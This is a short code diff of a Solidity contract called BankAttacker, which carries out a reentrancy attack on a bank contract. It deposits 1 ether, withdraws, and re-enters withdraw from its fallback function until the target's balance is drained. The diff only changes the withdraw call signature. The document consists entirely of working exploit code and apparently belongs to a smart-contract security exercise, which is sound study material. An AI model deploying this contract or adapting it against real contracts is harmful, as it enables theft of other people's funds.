@@ -5,7 +5,7 @@ pragma solidity ^0.8.0;
 interface IBank {
     function deposit() external payable;
 
-    function withdraw(uint amount) external;
+    function withdraw() external;
 }
 
 contract BankAttacker {
@@ -19,12 +19,12 @@ contract BankAttacker {
         require(bank.balance > 1 ether);
         require(msg.value >= 1 ether);
         IBank(bank).deposit{value : 1 ether}();
-        IBank(bank).withdraw(1 ether);
+        IBank(bank).withdraw();
     }
 
     fallback() external payable {
         if (bank.balance > 1.1 ether) {
-            IBank(bank).withdraw(1 ether);
+            IBank(bank).withdraw();
         }
     }
 }
